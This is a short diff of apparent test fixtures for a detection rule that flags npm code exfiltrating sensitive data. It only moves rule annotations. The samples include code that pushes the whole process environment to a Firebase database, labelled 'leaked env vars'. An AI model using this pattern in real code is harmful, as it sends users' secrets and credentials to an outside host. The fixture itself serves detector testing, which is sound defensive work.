@@ -66,8 +66,8 @@ function f(){
 function f(){
     var Firebase = require("firebase");
     var ref = new Firebase("https://abcde-fg-1234.firebaseio.com/");
-    var dbRef = ref.child("env_vars");
     // ruleid: npm-exfiltrate-sensitive-data
+    var dbRef = ref.child("env_vars");
     dbRef.push({status : "leaked env vars", message : process.env}, clean());
 
 }
@@ -75,8 +75,8 @@ function f(){
 function f(){
     var Firebase = require("firebase");
     var ref = new Firebase("https://abcde-fg-1234.firebaseio.com/");
-    var dbRef = ref.child("env_vars");
     // ok: npm-exfiltrate-sensitive-data
+    var dbRef = ref.child("env_vars");
     dbRef.push({status : "leaked env vars", message : "anymsg"}, clean());
 
 }
